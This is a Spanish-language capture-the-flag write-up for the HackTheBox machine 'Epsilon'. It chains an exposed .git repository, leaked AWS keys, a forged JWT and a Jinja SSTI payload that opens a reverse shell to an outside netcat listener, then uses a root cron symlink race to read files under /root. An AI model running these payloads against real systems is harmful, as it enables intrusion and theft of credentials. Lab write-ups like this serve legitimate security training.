# Writeup - Máquina Epsilon HTB

**Autor**: [Tu Nombre]  
**Plataforma**: HackTheBox  
**Dificultad**: Media  
**Sistema**: Linux  

---

## Reconocimiento

Lanzamos un nmap para descubrir puertos abiertos:

```
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.134
```
![Resultado de Nmap](Nmap.png)

Puertos abiertos:

22/tcp - SSH

80/tcp - HTTP (Apache)

5000/tcp - HTTP (Flask/Werkzeug)

Git Exposure - Puerto 80
Al acceder a http://10.10.11.134 obtenemos 403 Forbidden, pero descubrimos que el directorio .git/ está expuesto.

Descargar Repositorio .git
Con la herramienta gitdumper dumpeamos el codigo .git
```
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://10.10.11.134/.git/ ../../git_dump
```
![Herramienta](dumper.png)

Nos genera varios archivos 
vemos el codigo fuente de uno de ellos
Y nos encontramos con varias cosas interesantes, vemos unas credenciales
Una referencia a una secret key
Un formato de algoritmo HS256 que ya sabemos que tanto como HS256, HS384 y HC512 son algoritmos simetricos 
Analizar Historial de Commits

```
cd git_dump
git log --oneline
```
https://./images/git_log.png

Output:
```
c622771 (HEAD -> master) Fixed Typo
b10dd06 Adding Costume Site
c514416 Updating Tracking API
7cf92a7 Adding Tracking API Module
```
Encontrar Credenciales AWS
```
git show 7cf92a7
```
En el archivo track_api_CR_148.py encontramos:
```
session = Session(
    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilong.htb')
```
https://./images/aws_credentials.png

Analizar server.py
Encontramos una vulnerabilidad SSTI en la línea 59:
```
tmpl=render_template_string(message,costume=costume)
```
Y autenticación JWT con secret_key ofuscada:
```
secret = '<secret_key>'
```
https://./images/server_code.png

Enumeración AWS Lambda
Configurar AWS CLI
```
aws configure
```
Credenciales:

AWS Access Key: AQLA5M37BDN6FJP76TDC

AWS Secret Key: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A

Region: us-east-1

Enumerar Funciones Lambda
```
aws lambda list-functions --endpoint-url http://cloud.epsilon.htb
```
https://./images/lambda_functions.png

Encontramos: costume_shop_v1

Descargar Código de la Función
```
aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
wget "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code" -O lambda_code.zip
unzip lambda_code.zip
```
En lambda_function.py encontramos la secret_key real:
```
secret='RrXCv`mrNe!K!4+5`wYq'
```
https://./images/lambda_secret.png

Bypass de Autenticación JWT
Generar Token JWT
```
import jwt

secret = 'RrXCv`mrNe!K!4+5`wYq'
token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256')
print(f"Token: {token}")
```
Token generado:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
```
https://./images/jwt_token.png

Acceder como Administrador
En el navegador, abrir consola (F12) y ejecutar:
```
document.cookie = 'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
```
Luego navegar a: http://epsilon.htb:5000/home

https://./images/admin_access.png

Explotación SSTI
Verificar Vulnerabilidad
```
curl -X POST http://10.10.11.134:5000/order \
  -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
  --data-urlencode "costume={{7*7}}"
```
Respuesta contiene "49" → SSTI confirmado

https://./images/ssti_test.png

Reverse Shell
Preparar listener:
```
nc -nlvp 443
```
Enviar reverse shell:
```
curl -X POST http://10.10.11.134:5000/order \
  -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
  --data-urlencode "costume={{lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 443 >/tmp/f').read()}}"
```
https://./images/reverse_shell.png

Estabilizar Shell Con tratamiento de la TTY

Escalada de Privilegios
User Flag
```
find / -name "user.txt" 2>/dev/null
cat /home/ubuntu/user.txt
```
User Flag: e7b7a5a76e7c6a45b36a6f935d5cbd8a

https://./images/user_flag.png

Descubrir Cron Job Vulnerable
Usamos pspy para enumerar procesos:
```
./pspy64
```
https://./images/pspy.png

Encontramos un script de backup ejecutándose como root:
```
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```
Vulnerabilidad: Parámetro -h en tar que sigue symlinks.

Explotación
Crear script de explotación con nano:
```
#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
        echo "Symlink creado a /root/.ssh/id_rsa"
        break
    fi
    sleep 1
done
EOF
```
https://./images/exploit_script.png

Dar permisos y ejecutar:
```
chmod +x /tmp/exploit.sh
/tmp/exploit.sh &
```
Buscar backup más reciente:
```
latest_backup=$(ls -t /var/backups/web_backups/ | head -1) && cp "/var/backups/web_backups/$latest_backup" /tmp/ && cd /tmp && tar -xf "$latest_backup" && cat opt/backups/checksum
```
https://./images/backup_extract.png

Problema: Obtenemos el hash SHA1 en lugar de la clave privada.

Solución - Symlink a root.txt:
```
rm -f /opt/backups/checksum
ln -s -f /root/root.txt /opt/backups/checksum
```
Extraer root flag:
```
latest_backup=$(ls -t /var/backups/web_backups/ | head -1)
tar -xf "/var/backups/web_backups/$latest_backup" -O opt/backups/checksum
```
Root Flag:

https://./images/root_flag.png

Conclusión
Vulnerabilidades Explotadas
Git Repository Exposure - .git/ accesible públicamente

Hardcoded AWS Credentials - En historial de commits

JWT Weak Secret - Secret_key en función Lambda

Server-Side Template Injection - En endpoint /order

Insecure Cron Job - Parámetro -h en tar que sigue symlinks

Lecciones de Seguridad
Nunca exponer directorios .git/ en producción

Usar git-secrets para prevenir commit de credenciales

Rotar credenciales AWS regularmente

Sanitizar inputs en render_template_string()

Validar parámetros en scripts de cron (evitar tar -h)

Técnicas Utilizadas
Git Dumping

AWS Lambda Enumeration

JWT Bypass

SSTI to RCE

Symlink Exploitation

Cron Job Abuse

¡Máquina comprometida exitosamente!






























































